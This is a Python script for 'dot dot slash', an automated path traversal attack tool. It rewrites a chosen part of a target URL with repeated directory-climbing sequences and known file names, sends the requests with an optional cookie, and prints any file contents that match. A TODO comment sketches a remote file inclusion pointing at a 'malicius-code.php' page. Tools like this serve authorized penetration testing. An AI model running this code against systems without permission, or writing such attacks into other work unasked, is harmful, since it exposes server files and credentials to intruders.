#!/usr/bin/python3
import re
import argparse
import time
from match import *
from urllib import request

#TODO
# add -f --file
# add --os
# link to other site http://some_site.com.br/some-page?page=http://other-site.com.br/other-page.htm/malicius-code.php   
# use POST data
# mutiple headers
# solve 302 that turn 200
# save in sqlite/csv


# for key, value in windows.items(): print(key)


parser = argparse.ArgumentParser(description = 'dot dot slash - A automated Path Traversal Tester. Created by @jcesrstef.')
parser.add_argument('--url', action = 'store', dest = 'url', required = True, help = 'Url to attack.')
parser.add_argument('--string', action = 'store', dest = 'string', required = True, help = 'String in --url to attack. Ex: document.pdf')
parser.add_argument('--cookie', action = 'store', dest = 'cookie', required = False, help = 'Document cookie.')
parser.add_argument('--depth', action = 'store', dest = 'depth', required = False, type = int, default = '6', help = 'How deep we will go?')
arguments = parser.parse_args()


banner = "\
     _       _         _       _         _           _     \n\
  __| | ___ | |_    __| | ___ | |_   ___| | __ _ ___| |__  \n\
 / _` |/ _ \| __|  / _` |/ _ \| __| / __| |/ _` / __| '_ \ \n\
| (_| | (_) | |_  | (_| | (_) | |_  \__ \ | (_| \__ \ | | |\n\
 \__,_|\___/ \__|  \__,_|\___/ \__| |___/_|\__,_|___/_| |_|\n\
                                                           \n\
Automated Path Traversal Tester\n\
version 0.0.2\n\
Created by Julio Cesar Stefanutto (@jcesarstef)\n\
\
"
print(banner)


class bcolors:
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'



def forloop():	
	count = 0
	while (count != arguments.depth):
		for var in dotvar:
			for word in match.keys():
				rewrite = (var * count) + word
				fullrewrite = re.sub(arguments.string,  rewrite , arguments.url)
				req = request.Request(fullrewrite)
				if (arguments.cookie):
					req.add_header("Cookie", arguments.cookie)
				resp = request.urlopen(req)
				
				catchdata = re.findall(str(match[word]), resp.read().decode())
				if (len(catchdata) != 0):
					print(bcolors.OKGREEN + "\n[" + str(resp.code) + "] " + bcolors.ENDC + fullrewrite)
					print(" Content Found: " + str(len(catchdata)))
				icount = 0
				# Print match
				for i in catchdata:
					print(" " + bcolors.FAIL + str(i) + bcolors.ENDC)
					icount = icount + 1
					if (icount > 6):
						print(" [...]")
						break
		count = count + 1

forloop()
